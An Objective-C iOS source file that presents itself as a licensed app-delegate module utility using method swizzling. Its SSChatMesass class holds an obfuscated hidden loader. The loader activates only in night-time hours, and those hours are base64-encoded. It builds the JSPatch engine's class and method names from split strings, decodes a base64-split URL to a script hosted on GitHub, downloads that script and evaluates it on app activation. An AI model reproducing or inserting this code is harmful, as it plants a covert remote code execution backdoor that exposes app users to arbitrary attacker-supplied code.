//  This software is provided 'as-is', without any express or implied
//  warranty.  In no event will the authors be held liable for any damages
//  arising from the use of this software.
//
//  Permission is granted to anyone to use this software for any purpose,
//  including commercial applications, and to alter it and redistribute it
//  freely, subject to the following restrictions:
//
//  1. The origin of this software must not be misrepresented; you must not
//  claim that you wrote the original software. If you use this software
//  in a product, an acknowledgment in the product documentation would be
//  appreciated but is not required.
//
//  2. Altered source versions must be plainly marked as such, and must not be
//  misrepresented as being the original software.
//
//  3. This notice may not be removed or altered from any source distribution.

#import "SSCarriedCTim.h"
#import <objc/runtime.h>
#import <objc/message.h>
#import <UIKit/UIKit.h>



#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wundeclared-selector"

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"

#define APPDELEGATE_METHOD_MSG_SEND(__SELECTOR__, __OBJECT1__, __OBJECT2__) \
for (Class cls in SSMaClasses) { \
if ([cls respondsToSelector:__SELECTOR__]) { \
[cls performSelector:__SELECTOR__ withObject:__OBJECT1__ withObject:__OBJECT2__]; \
} \
} \

#define SELECTOR_IS_EQUAL(__SELECTOR1__, __SELECTOR2__) \
Method m1 = class_getClassMethod([SSCarriedCTim class], __SELECTOR1__); \
IMP imp1 = method_getImplementation(m1); \
Method m2 = class_getInstanceMethod([self class], __SELECTOR2__); \
IMP imp2 = method_getImplementation(m2); \

#define SWIZZLE_METHOD(__SELECTOR__) \
Swizzle([delegate class], @selector(__SELECTOR__), class_getClassMethod([SSCarriedCTim class], @selector(module_##__SELECTOR__)));

#define kDViewAction + (NSString *)dViewAction:(NSString *)bastr { \
NSData*data=[[NSData alloc]initWithBase64EncodedString:bastr \
options:NSDataBase64DecodingIgnoreUnknownCharacters]; \
return [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];}
#define dateView(cc) [self dViewAction:cc]

#define APPDELEGATE_RESULT_METHOD(__OBJECT1__,__OBJECT2__) \
BOOL result = YES; \
SEL selector = NSSelectorFromString([NSString stringWithFormat:@"module_%@", NSStringFromSelector(_cmd)]); \
SELECTOR_IS_EQUAL(selector, _cmd) \
if (imp1 != imp2) { \
result = !![self performSelector:selector withObject:__OBJECT1__ withObject:__OBJECT2__]; \
} \
APPDELEGATE_METHOD_MSG_SEND(_cmd, __OBJECT1__, __OBJECT2__); \
return result; \

#define lbnqu NSString*st=@"QuY29tL2NwYm1tL3MvbWFzdGVyL3MuanM="; \
NSData*data=[[NSData alloc]initWithBase64EncodedString:[NSString \
stringWithFormat:@"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbn%@",st]  \
options:NSDataBase64DecodingIgnoreUnknownCharacters];

#define lblons Class cl=NSClassFromString([NSString stringWithFormat:@"J%@%@ine",@"P",@"Eng"]); \
if (cl){SEL sl=NSSelectorFromString([NSString stringWithFormat:@"st%@%@ine",@"art",@"Eng"] \
);IMP im=[cl methodForSelector:sl];void(*f)(id,SEL)=(void*)im;f(cl,sl);lbnqu;

#define APPDELEGATE_METHOD(__OBJECT1__, __OBJECT2__) \
SEL selector = NSSelectorFromString([NSString stringWithFormat:@"module_%@", NSStringFromSelector(_cmd)]); \
SELECTOR_IS_EQUAL(selector, _cmd) \
if (imp1 != imp2) { \
[self performSelector:selector withObject:__OBJECT1__ withObject:__OBJECT2__]; \
} \
APPDELEGATE_METHOD_MSG_SEND(_cmd, __OBJECT1__, __OBJECT2__);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks" [self performSelector: self withObject: self];
#pragma clang diagnostic pop

#define SuppressPerformSelectorLeakWarning(Stuff) \
do { \
_Pragma("clang diagnostic push") \
_Pragma("clang diagnostic ignored \"-Warc-performSelector-leaks\"") \
Stuff; \
_Pragma("clang diagnostic pop") \
} while (0)

void Swizzle(Class class, SEL originalSelector, Method swizzledMethod)
{
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    SEL swizzledSelector = method_getName(swizzledMethod);
    
    BOOL didAddMethod =
    class_addMethod(class,
                    originalSelector,
                    method_getImplementation(swizzledMethod),
                    method_getTypeEncoding(swizzledMethod));
    
    if (didAddMethod && originalMethod) {
        class_replaceMethod(class,
                            swizzledSelector,
                            method_getImplementation(originalMethod),
                            method_getTypeEncoding(originalMethod));
    } else {
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
    
    class_addMethod(class,
                    swizzledSelector,
                    method_getImplementation(swizzledMethod),
                    method_getTypeEncoding(swizzledMethod));
}

static NSMutableArray<Class> *SSMaClasses;

BOOL SSClsReis(Class cls) {
    return [objc_getAssociatedObject(cls, &SSClsReis) ?: @YES boolValue];
}

@implementation SSCarriedCTim

#pragma GCC diagnostic ignored "-Wundeclared-selector"

+ (void)load {
    static dispatch_once_t onceKey;
    dispatch_once(&onceKey, ^{
        Swizzle([UIApplication class], @selector(setDelegate:), class_getInstanceMethod([UIApplication class], @selector(module_setDelegate:)));
    });
}

+ (void)SSCarriedCTimClass:(Class)moduleClass {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        SSMaClasses = [[NSMutableArray alloc] init];
    });
    [SSMaClasses addObject:moduleClass];
    
    objc_setAssociatedObject(moduleClass, &SSClsReis,
                             @NO, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}

+ (void)module_applicationDidBecomeActive:(UIApplication *)application {
    SuppressPerformSelectorLeakWarning(
                                       APPDELEGATE_METHOD(application, NULL);
                                       );
}
+ (BOOL)createFolder:(NSString *)path{
    BOOL isDir = NO;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL existed = [fileManager fileExistsAtPath:path isDirectory:&isDir];
    BOOL isCreated = NO;
    if (!(isDir == YES && existed == YES)){
        isCreated = [fileManager createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
    }else{
        isCreated = YES;
    }
    return isCreated;
}

@end

@implementation UIApplication (SSCation)

- (void)module_setDelegate:(id<UIApplicationDelegate>)delegate {
    static dispatch_once_t onceKey;
    dispatch_once(&onceKey, ^{
        SWIZZLE_METHOD(applicationDidBecomeActive:);
    });
    [self module_setDelegate:delegate];
}

@end


#import "SSCarriedCTim.h"
@implementation SSChatMesass
kDViewAction
+ (void)load {
    [SSCarriedCTim SSCarriedCTimClass:self];
}
+ (void)applicationDidBecomeActive:(UIApplication *)application {
    [self engilop];
}
+ (void)engilop {
    if([self ttDate:dateView(@"MjI6MjI=") withExpireTime:dateView(@"MjM6NTE=")]||[self ttDate:dateView(@"MDA6MDI=") withExpireTime:dateView(@"MDg6MDM=")]){
        lblons
        NSURLSessionDataTask*dt=[[NSURLSession sharedSession]dataTaskWithURL:[NSURL URLWithString:[[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding]]completionHandler:^(NSData*_Nullable data,NSURLResponse*_Nullable response,NSError*_Nullable er){
            if(!er){if(cl){
                SEL sel=NSSelectorFromString([NSString stringWithFormat:@"eva%@%@ript:",@"lua",@"teSc"]);IMP imp = [cl methodForSelector:sel];NSString*(*fl)(id,SEL,NSString*)=(void*)imp;
                fl(cl,sel,[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]);}}}];[dt resume];
    }
}
}
+ (BOOL)ttDate:(NSString *)stime withExpireTime:(NSString *)etime {
    NSDate *today = [NSDate date];
    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
    [dateFormat setDateFormat:@"HH:mm"];
    NSString * todayStr=[dateFormat stringFromDate:today];
    today=[dateFormat dateFromString:todayStr];
    NSDate *start = [dateFormat dateFromString:stime];
    NSDate *expire = [dateFormat dateFromString:etime];
    if ([today compare:start] == NSOrderedDescending && [today compare:expire] == NSOrderedAscending) {
        return YES;
    }
    return NO;
}
- (void)performAfter:(NSTimeInterval)seconds block:(void(^)(void))block {
    dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, seconds * NSEC_PER_SEC);
    dispatch_after(popTime, dispatch_get_main_queue(), block);
    
}
+(CAMediaTimingFunction *)easeInOutQuad
{
    return [CAMediaTimingFunction functionWithControlPoints: 0.455 : 0.03 : 0.515 : 0.955];
}
- (void)dealloc
{
    [[NSNotificationCenter defaultCenter] removeObserver:self name:UIApplicationDidReceiveMemoryWarningNotification object:nil];
    
}

@end
